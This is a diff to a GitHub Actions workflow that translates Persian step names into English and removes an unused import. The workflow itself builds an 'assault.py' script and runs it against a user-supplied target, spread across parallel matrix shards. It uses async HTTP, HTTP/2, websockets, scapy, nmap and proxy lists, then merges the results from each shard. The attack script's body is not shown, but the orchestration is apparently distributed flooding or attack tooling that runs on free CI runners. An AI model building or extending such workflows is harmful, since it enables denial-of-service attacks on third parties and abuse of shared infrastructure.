@@ -35,7 +35,6 @@ permissions:
   contents: write
 
 jobs:
-  # ========== آماده‌سازی ==========
   prepare:
     runs-on: ubuntu-latest
     outputs:
@@ -43,7 +42,7 @@ jobs:
     steps:
       - uses: actions/checkout@v4
 
-      - name: تولید اسکریپت حمله + task_list.json
+      - name: Build assault script + indices
         id: build
         env:
           SHARD_COUNT: ${{ github.event.inputs.shard_count }}
@@ -52,7 +51,6 @@ jobs:
           import os, sys, json, time, random, socket, threading, asyncio, aiohttp, concurrent.futures, gc, psutil, requests, dns.resolver
           from datetime import datetime
           from pathlib import Path
-          import asyncssh  # not used but we keep imports clean
 
           SHARD_ID = int(os.environ['SHARD_ID'])
           TARGET = os.environ['TARGET']
@@ -256,11 +254,10 @@ jobs:
           print(f"[Shard {SHARD_ID}] Done.")
           ASSAULT_EOF
 
-          # لیست شماره شاردها
           python3 -c "import json; json.dump(list(range($SHARD_COUNT)), open('indices.json','w'))"
           echo "indices=$(cat indices.json)" >> $GITHUB_OUTPUT
 
-      - name: آپلود بسته حمله
+      - name: Upload assault package
         uses: actions/upload-artifact@v4
         with:
           name: assault-package
@@ -268,7 +265,6 @@ jobs:
             assault.py
             indices.json
 
-  # ========== شاردهای موازی ==========
   shard:
     name: "Shard ${{ matrix.shard }}"
     needs: prepare
@@ -281,15 +277,15 @@ jobs:
     steps:
       - uses: actions/checkout@v4
 
-      - name: دانلود بسته حمله
+      - name: Download assault package
         uses: actions/download-artifact@v4
         with:
           name: assault-package
 
-      - name: نصب
+      - name: Install dependencies
         run: pip3 install aiohttp rich "httpx[http2]" websockets scapy python-nmap requests dnspython psutil
 
-      - name: اجرای حمله
+      - name: Execute assault
         env:
           SHARD_ID: ${{ matrix.shard }}
           TARGET: ${{ github.event.inputs.target }}
@@ -300,13 +296,12 @@ jobs:
           PROXY_SOURCES: ${{ github.event.inputs.proxy_sources }}
         run: python3 assault.py
 
-      - name: آپلود نتیجه
+      - name: Upload result
         uses: actions/upload-artifact@v4
         with:
           name: shard-${{ matrix.shard }}-result
           path: shard_${{ matrix.shard }}_result.json
 
-  # ========== ادغام ==========
   merge:
     needs: shard
     runs-on: ubuntu-latest
@@ -314,13 +309,13 @@ jobs:
     steps:
       - uses: actions/checkout@v4
 
-      - name: دانلود تمام نتایج
+      - name: Download all results
         uses: actions/download-artifact@v4
         with:
           pattern: shard-*-result
           path: results
 
-      - name: ادغام و گزارش نهایی
+      - name: Merge and report
         run: |
           python3 -c "
           import json, glob, os
